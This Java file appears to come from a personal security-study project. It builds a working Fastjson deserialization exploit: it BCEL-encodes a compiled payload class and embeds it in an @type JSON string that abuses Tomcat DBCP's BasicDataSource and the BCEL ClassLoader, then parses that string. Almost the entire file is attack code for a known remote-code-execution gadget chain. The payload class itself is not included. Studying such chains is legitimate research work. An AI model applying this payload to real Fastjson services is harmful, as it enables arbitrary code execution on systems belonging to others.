/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.fastjson;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
//import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.nio.file.Files;

public class FastjsonBcel {
    public static void main(String[] args) throws Exception {
        //ClassLoader classLoader = new ClassLoader();
        //转字节码
        byte[] bytes = convert("H:\\Java_Project\\Java_Security\\out\\production\\Java_Security\\com\\y5neko\\sec\\fastjson\\FastjsonBcelPayload.class");
        String code = Utility.encode(bytes,true);
        //BCEL加载
        //classLoader.loadClass("$$BCEL$$" + code).newInstance();

        System.out.println(code);

//        BasicDataSource basicDataSource = new BasicDataSource();
//        basicDataSource.setDriverClassLoader(classLoader);
//        basicDataSource.setDriverClassName("$$BCEL$$" + code);
//        basicDataSource.getConnection();
        String string = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                "\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
                "\"driverClassName\":\"$$BCEL$$" + code + "\"}";

        JSON.parseObject(string);
    }
    private static byte[] convert(String filePath) throws Exception {
        File file = new File(filePath);
        if (!file.exists()) {
            throw new Exception("文件不存在");
        }
        //读取文件为字节码
        try (InputStream inputStream = Files.newInputStream(file.toPath())) {
            ByteArrayOutputStream byteOutput = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = inputStream.read(buffer)) != -1) {
                byteOutput.write(buffer, 0, bytesRead);
            }
            return byteOutput.toByteArray();
        }
    }
}
